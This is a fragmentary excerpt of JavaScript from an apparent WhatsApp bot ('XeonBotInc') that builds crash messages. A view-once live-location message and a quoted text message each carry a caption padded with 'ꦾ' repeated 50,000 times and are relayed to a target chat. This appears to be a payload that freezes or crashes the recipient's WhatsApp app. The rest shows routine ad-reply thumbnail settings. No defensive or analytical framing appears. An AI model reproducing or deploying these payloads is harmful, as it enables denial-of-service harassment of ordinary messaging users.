    ...
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Out_by_Thunder⚡Out_by_Thunder⚡' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
  ...
  XeonBotInc.relayMessage(jid, {
    'extendedTextMessage': {
      ...
      'contextInfo': {
        ...
        'participant': jid,
        'quotedMessage': {
          'conversation': 'Out_by_Thunder⚡Out_by_Thunder⚡' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
                    ...
                    XeonBotInc.sendMessage(i, {
                        ...
                        contextInfo: {
                            externalAdReply: {
                                ...
                                thumbnailUrl: 'https://i.ibb.co/T1R5rLK/thumb.jpg',
                    ...
                    XeonBotInc.sendMessage(m.chat, {
                        ...
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/T1R5rLK/thumb.png',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
